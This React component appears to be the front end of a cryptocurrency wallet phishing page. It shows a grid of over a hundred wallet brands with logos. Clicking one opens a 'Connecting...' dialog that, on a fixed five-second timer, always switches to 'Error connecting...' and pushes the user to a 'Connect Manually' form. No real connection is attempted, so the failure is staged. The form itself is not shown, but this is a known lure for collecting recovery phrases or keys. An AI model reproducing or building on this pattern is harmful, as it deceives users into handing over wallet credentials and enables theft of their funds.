import React, { useContext, useEffect, useState } from "react";
import Loader from "../utils/Loader";
import { useNavigate } from "react-router-dom";
// import AOS from "aos";
// import "aos/dist/aos.css";

import {
  Modal,
  Button,
  Card,
  Alert,
  Avatar,
  Spinner,
  Badge,
} from "flowbite-react";
import { HiInformationCircle } from "react-icons/hi";
import { ProjectContext } from "../context/ProjectContext";

const Wallets = () => {
  const myWallets = [
    {
      id: 0,
      wallet: "wallet connect",
      image: "assets/walletconect.png",
    },
    {
      id: 1,
      wallet: "metamask",
      image: "assets/metamask.png",
    },
    {
      id: 2,
      wallet: "tonkeeper",
      image: "assets/tonkeeper.png",
    },
    {
      id: 3,
      wallet: "phantom",
      image: "assets/phantom.png",
    },
    {
      id: 4,
      wallet: "trust wallet",
      image: "assets/trust.png",
    },
    {
      id: 5,
      wallet: "safepal",
      image: "assets/safepal.png",
    },
    {
      id: 6,
      wallet: "TON wallet",
      image: "assets/ton.png",
    },
    {
      id: 7,
      wallet: "nami",
      image: "assets/nami.png",
    },
    {
      id: 8,
      wallet: "imtoken",
      image: "assets/imtoken.jpeg",
    },
    {
      id: 9,
      wallet: "math",
      image: "assets/math.jpeg",
    },
    {
      id: 10,
      wallet: "token pocket",
      image: "assets/tokenpocket.png",
    },
    {
      id: 11,
      wallet: "solflare",
      image: "https://res.cloudinary.com/dmnub1pdp/image/upload/v1734286072/download_tp5ilz.jpg",
    },
    {
      id: 12,
      wallet: "torus",
      image: "assets/torus.jpeg",
    },
    {
      id: 13,
      wallet: "rainbow",
      image: "assets/rainbow.jpeg",
    },
    {
      id: 14,
      wallet: "uniswap",
      image: "assets/uniswap.png",
    },
    {
      id: 15,
      wallet: "wallETH",
      image: "assets/wallETH.png",
    },
    {
      id: 16,
      wallet: "Xdefi",
      image: "assets/xdefi.jpeg",
    },
    {
      id: 17,
      wallet: "xinfin",
      image: "assets/xinfin.png",
    },
    {
      id: 18,
      wallet: "yoroi",
      image: "assets/yoroi.png",
    },
    {
      id: 19,
      wallet: "onto",
      image: "assets/onto.png",
    },
    {
      id: 20,
      wallet: "ime",
      image: "assets/ime.jpeg",
    },
    {
      id: 21,
      wallet: "eternl",
      image: "assets/eternl.jpeg",
    },
    {
      id: 22,
      wallet: "alpha",
      image: "assets/alpha.png",
    },
    {
      id: 23,
      wallet: "argent",
      image: "assets/argent.png",
    },
    {
      id: 24,
      wallet: "bitpay",
      image: "assets/bitpay.png",
    },
    {
      id: 25,
      wallet: "brave",
      image: "assets/brave.png",
    },
    {
      id: 26,
      wallet: "coin98",
      image: "assets/coin98.jpeg",
    },
    {
      id: 27,
      wallet: "coinbase",
      image: "assets/coinbase.png",
    },
    {
      id: 28,
      wallet: "ellipal",
      image: "assets/ellipal.png",
    },
    {
      id: 29,
      wallet: "gero",
      image: "assets/gero.jpeg",
    },
    {
      id: 30,
      wallet: "guarda",
      image: "assets/guarda.jpeg",
    },
    {
      id: 31,
      wallet: "ledger live",
      image: "assets/ledger.png",
    },
    {
      id: 32,
      wallet: "alice",
      image: "assets/alice.png",
    },
    {
      id: 33,
      wallet: "aave",
      image: "assets/aave.png",
    },
    {
      id: 34,
      wallet: "adex network",
      image: "assets/adex.jpeg",
    },
    {
      id: 35,
      wallet: "aktionariat",
      image: "assets/aktionariat.jpg",
    },
    {
      id: 36,
      wallet: "authereum",
      image: "assets/authereum.png",
    },
    {
      id: 37,
      wallet: "aToken wallet",
      image: "assets/atoken.jpeg",
    },
    {
      id: 38,
      wallet: "anchor",
      image: "assets/anchor.png",
    },
    {
      id: 39,
      wallet: "ballet",
      image: "assets/ballet.png",
    },
    {
      id: 40,
      wallet: "bifrost",
      image: "assets/bifrost.jpg",
    },
    {
      id: 41,
      wallet: "binance chain",
      image: "assets/bsc-logo.png",
    },
    {
      id: 42,
      wallet: "bitget",
      image: "assets/bitget.png",
    },
    {
      id: 43,
      wallet: "coldcard",
      image: "assets/coldcard.jpeg",
    },
    {
      id: 44,
      wallet: "blockchain",
      image: "assets/blockchain-logo.png",
    },
    {
      id: 45,
      wallet: "blocto",
      image: "assets/blocto.webp",
    },
    {
      id: 46,
      wallet: "bluemoon",
      image: "assets/bluemoon.png",
    },
    {
      id: 47,
      wallet: "bluewallet",
      image: "assets/bluewallet.png",
    },
    {
      id: 48,
      wallet: "coti",
      image: "assets/coti.jpg",
    },
    {
      id: 49,
      wallet: "crypto.com",
      image: "assets/crypto.png",
    },
    {
      id: 50,
      wallet: "1inch",
      image: "assets/1inch.jpeg",
    },
    {
      id: 51,
      wallet: "kucoin",
      image: "https://res.cloudinary.com/dmnub1pdp/image/upload/v1734285516/download_sebwfr.png",
    },
    {
      id: 52,
      wallet: "tangem",
      image: "https://res.cloudinary.com/dmnub1pdp/image/upload/v1734285551/tangem_awjoi0.png",
    },
    {
      id: 53,
      wallet: "cybavo wallet",
      image: "assets/cybavowallet.png",
    },
    {
      id: 54,
      wallet: "d cent",
      image: "assets/dcent.jpeg",
    },
    {
      id: 55,
      wallet: "defiant",
      image: "assets/defiant.jpeg",
    },
    {
      id: 56,
      wallet: "dero",
      image: "assets/dero.png",
    },
    {
      id: 57,
      wallet: "digitex",
      image: "assets/digitex.png",
    },
    {
      id: 58,
      wallet: "DyDx",
      image: "assets/dydx.jpeg",
    },
    {
      id: 59,
      wallet: "eidoo",
      image: "assets/eidoo.png",
    },
    {
      id: 60,
      wallet: "equal",
      image: "assets/equal.png",
    },
    {
      id: 61,
      wallet: "fantom",
      image: "assets/fantom.png",
    },
    {
      id: 62,
      wallet: "fetch",
      image: "assets/fetch.png",
    },
    {
      id: 63,
      wallet: "flare",
      image: "assets/flare.jpeg",
    },
    {
      id: 64,
      wallet: "graph",
      image: "assets/graph.png",
    },
    {
      id: 65,
      wallet: "gridplus",
      image: "assets/gridplus.png",
    },
    {
      id: 66,
      wallet: "hashkey",
      image: "assets/hashkey.jpeg",
    },
    {
      id: 67,
      wallet: "huobi",
      image: "assets/Huobi.png",
    },
    {
      id: 68,
      wallet: "infinito",
      image: "assets/infinito.png",
    },
    {
      id: 69,
      wallet: "infinity",
      image: "assets/infinity.png",
    },
    {
      id: 70,
      wallet: "itoken",
      image: "assets/itoken.png",
    },
    {
      id: 71,
      wallet: "jade",
      image: "assets/jade.jpeg",
    },
    {
      id: 72,
      wallet: "kelpr",
      image: "assets/kelpr.png",
    },
    {
      id: 73,
      wallet: "lead",
      image: "assets/lead.png",
    },
    {
      id: 74,
      wallet: "ledger",
      image: "assets/ledger.png",
    },
    {
      id: 75,
      wallet: "maiar",
      image: "assets/maiar.png",
    },
    {
      id: 76,
      wallet: "mantra dao",
      image: "assets/mantradao.jpeg",
    },
    {
      id: 77,
      wallet: "matcha",
      image: "assets/matcha.jpeg",
    },
    {
      id: 78,
      wallet: "meetone",
      image: "assets/meetone.png",
    },
    {
      id: 79,
      wallet: "morix",
      image: "assets/morixwallet.png",
    },
    {
      id: 80,
      wallet: "mycrypto",
      image: "assets/mycrypto.jpeg",
    },
    {
      id: 81,
      wallet: "nash",
      image: "assets/nash.png",
    },
    {
      id: 82,
      wallet: "nova",
      image: "assets/nova.jpg",
    },
    {
      id: 83,
      wallet: "nym",
      image: "assets/nym.png",
    },
    {
      id: 84,
      wallet: "okx",
      image: "assets/okx.jpeg",
    },
    {
      id: 85,
      wallet: "oasis",
      image: "assets/oasis.jpeg",
    },
    {
      id: 86,
      wallet: "opensea",
      image: "assets/opensea.jpeg",
    },
    {
      id: 87,
      wallet: "opera wallet",
      image: "assets/opera.png",
    },
    {
      id: 88,
      wallet: "ownbit",
      image: "assets/ownbit.png",
    },
    {
      id: 89,
      wallet: "payb",
      image: "assets/payb.png",
    },
    {
      id: 90,
      wallet: "phoenix",
      image: "assets/Phoenix.png",
    },
    {
      id: 91,
      wallet: "pillar",
      image: "assets/pillar.png",
    },
    {
      id: 92,
      wallet: "plasma pay",
      image: "assets/plasmapay.jpeg",
    },
    {
      id: 93,
      wallet: "polkadotjs",
      image: "assets/polkadotjs.png",
    },
    {
      id: 94,
      wallet: "q3 wallet",
      image: "assets/q3.jpeg",
    },
    {
      id: 95,
      wallet: "radix",
      image: "assets/radix.png",
    },
    {
      id: 96,
      wallet: "ronin",
      image: "assets/ronin.webp",
    },
    {
      id: 97,
      wallet: "rwallet",
      image: "assets/rwallet.jpeg",
    },
    {
      id: 98,
      wallet: "saita mask",
      image: "assets/saita.jpg",
    },
    {
      id: 99,
      wallet: "simplehold",
      image: "assets/simplehold.jpg",
    },
    {
      id: 100,
      wallet: "sonic chain",
      image: "assets/sonic.png",
    },
    {
      id: 101,
      wallet: "sparkpoint",
      image: "assets/sparkpoint.png",
    },
    {
      id: 102,
      wallet: "spatium",
      image: "assets/spatium.png",
    },
    {
      id: 103,
      wallet: "staked",
      image: "assets/stakedwallet.jpg",
    },
    {
      id: 105,
      wallet: "tongue",
      image: "assets/tongue.jpeg",
    },
    {
      id: 106,
      wallet: "tron",
      image: "assets/tron.png",
    },
    {
      id: 107,
      wallet: "trust vault",
      image: "assets/trustvault.jpeg",
    },
    {
      id: 108,
      wallet: "vechain",
      image: "assets/vechain.png",
    },
    {
      id: 109,
      wallet: "via wallet",
      image: "assets/viawallet.png",
    },
    {
      id: 110,
      wallet: "wallet.io",
      image: "assets/wallet.io.png",
    },
    {
      id: 111,
      wallet: "wazrix",
      image: "assets/wazrix.png",
    },
    {
      id: 112,
      wallet: "yearn",
      image: "assets/yearn.jpeg",
    },
    {
      id: 113,
      wallet: "zaper",
      image: "assets/zaper.jpeg",
    },
    {
      id: 114,
      wallet: "zerion",
      image: "assets/zerion.jpeg",
    },
  ];

  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  const [openModal, setOpenModal] = useState(false);
  const [modalPlacement, setModalPlacement] = useState("center");
  const [indexWallet, setIndexWallet] = useState(null); // State to hold the selected wallet ID
  const { setWalletName } = useContext(ProjectContext);

  const goToForm = (wallet) => {
    setOpenModal(false);
    navigate("/connect");
    setWalletName(`${wallet}`);
  };

  const closeModal = () => {
    setOpenModal(false);
    setIsSearching(false);
  };

  const handleWalletClick = (id) => {
    setOpenModal(true);
    // setIsSearching(true);
    setIndexWallet(id); // Update state with the clicked wallet ID
  };

  if (openModal == true) {
    setTimeout(() => {
      setIsSearching(true);
    }, 5000);
  }

  useEffect(() => {
    setTimeout(() => {
      setLoading(true);
    }, 1500);

    // AOS.init({
    //   // Global settings
    //   duration: 1000, // animation duration in milliseconds
    //   once: false, // whether animation should happen only once while scrolling down
    // });
  });

  const selectedWallet = myWallets.filter(
    (wallet) => wallet.id === indexWallet
  );

  // console.log(selectedWallet);

  return loading ? (
    <main className="bg-gray-100 dark:bg-[#101720]">
      <section className="flex flex-col gap-10 max-w-screen-xl mx-auto px-6 xl:px-10 py-10 min-h-screen">
        <div
          data-aos="fade-down"
          className="flex flex-col justify-center items-center"
        >
          <h1 className="text-3xl xl:text-4xl text-gray-900 dark:text-white font-bold capitalize">
            Connect to your wallet
          </h1>
          <p className="text-lg font-semibold leading-snug mt-4 text-gray-900 dark:text-gray-300">
            Select a wallet to continue
          </p>
          <p className="text-base leading-snug mt-2 text-gray-900 dark:text-gray-500">
            Several iOS and Android wallets are compatible with the protocol,
            enabling seamless integration. By scanning a QR code displayed on
            your desktop screen, you can instantly link your mobile wallet to a
            decentralized application (dApp) for secure usage. Additionally,
            mobile apps can seamlessly interact with mobile browsers through the
            support of mobile deep linking.
          </p>
        </div>

        <Modal show={openModal} position={modalPlacement} onClose={closeModal}>
          <Modal.Header>Connect Now</Modal.Header>
          <Modal.Body>
            <div data-aos="zoom-in" className="flex flex-col gap-4">
              {isSearching ? (
                <Alert color="failure" icon={HiInformationCircle}>
                  <div className="flex items-center gap-3 flex-wrap w-full">
                    <span className="font-medium truncate">
                      Error connecting...
                    </span>
                    <Badge
                      onClick={() => goToForm(selectedWallet[0].wallet)}
                      className="cursor-pointer truncate"
                      color="success"
                    >
                      Connect Manually
                    </Badge>
                  </div>
                </Alert>
              ) : (
                <Alert color="info">
                  <div className="flex item-start gap-3 text-sm lg:text-base">
                    <span className="font-medium">Connecting...</span>
                    <Spinner color="info" aria-label="Info spinner example" />
                  </div>
                </Alert>
              )}

              <Card
                onClick={
                  isSearching ? () => goToForm(selectedWallet[0].wallet) : null
                }
                className="cursor-pointer"
              >
                <div className="flex items-center justify-between">
                  <div className="text-gray-900 dark:text-gray-50">
                    <h4 className="text-base xl:text-lg font-semibold uppercase ">
                      {selectedWallet[0]?.wallet}
                    </h4>
                    <small>Easy-to-use browser extension</small>
                  </div>

                  <Avatar img={selectedWallet[0]?.image} status="online" />
                </div>
              </Card>
            </div>
          </Modal.Body>
          <Modal.Footer>
            <Button color="gray" onClick={closeModal}>
              Cancel
            </Button>
          </Modal.Footer>
        </Modal>
        <div
          data-aos="fade-up"
          className="grid gap-3 lg:gap-4 grid-cols-2 md:grid-cols-4 xl:grid-cols-6"
        >
          {myWallets.map((wallet, index) => (
            <Card onClick={() => handleWalletClick(wallet.id)} key={index}>
              <div className="flex items-center justify-between gap-2 cursor-pointer">
                <img
                  className="lg:h-12 lg:w-12 h-10 w-10 object-cover object-center rounded-xl"
                  src={wallet.image}
                  alt={wallet.wallet}
                  loading="lazy"
                />
                <h1 className="capitalize text-sm font-bold truncate text-gray-900 dark:text-gray-300">
                  {wallet.wallet}
                </h1>
              </div>
            </Card>
          ))}
        </div>
      </section>
    </main>
  ) : (
    <Loader />
  );
};

export default Wallets;
